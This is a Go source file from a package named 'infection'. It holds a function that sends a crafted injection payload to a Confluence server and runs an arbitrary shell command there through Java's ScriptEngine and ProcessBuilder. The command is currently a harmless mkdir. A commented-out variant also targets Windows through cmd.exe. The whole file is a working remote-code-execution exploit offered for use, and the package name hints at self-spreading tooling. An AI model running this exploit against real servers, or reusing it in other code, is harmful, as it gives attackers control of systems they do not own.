package infection

import (
	"io/ioutil"
	"log"
	"net/http"
  "net/url"
)

func ConfluenceCmdExecute(targetUrl string, endpoint string) string {

  var cmd string
	cmd = "mkdir /tmp/confluenceTest"

  exploitUrl := targetUrl + endpoint
  /* This is used in the python script
  postHeader, _ := json.Marshal(map[string]string{
    "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Encoding": "gzip, deflate",
  })
  */
  /*postData, _ := json.Marshal(map[string]string {
    "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+cmd+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027",
  })*/

  postData := make(url.Values)
  postData.Add("queryString", "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027") 
  
  response, err := http.PostForm(exploitUrl, postData)

  if err != nil {
    log.Fatal("An Error Occured %v", err)
  }

  defer response.Body.Close()

  body, err := ioutil.ReadAll(response.Body)
  if err != nil {
    log.Fatal(err)
  }
  sb := string(body)

  log.Println(sb)

  return "ConfluenceCmdExecute Finished"
  }
